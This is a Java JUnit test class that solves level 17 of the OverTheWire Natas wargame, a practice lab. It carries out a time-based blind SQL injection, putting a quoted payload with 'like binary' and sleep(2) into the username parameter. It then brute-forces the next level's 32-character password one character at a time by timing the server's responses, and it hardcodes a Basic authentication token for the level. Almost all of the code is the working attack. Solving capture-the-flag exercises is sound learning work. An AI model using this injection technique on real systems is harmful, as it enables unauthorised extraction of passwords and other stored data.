import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Natas17 extends BaseClass{
    final String url = "http://natas17.natas.labs.overthewire.org/index.php?debug";
    final String authToken = "Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==";

    @Test
    public void getPassword() {
        StringBuilder sb = new StringBuilder();
        String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        while (sb.length() < 32) {
            for (char c : alphabet.toCharArray()) {
                Map<String, String> params = new HashMap<>();
                params.put("username", "natas18\" and password like binary \"" + sb.toString() + c + "%\" and sleep(2) and username =\"natas18");
                Response response = getRequestWithParams(url, authToken, params);
                if (response.getTime() / 1000 > 1) {
                    sb.append(c);
                }
            }
        }
        System.out.println(sb.toString());
    }
}
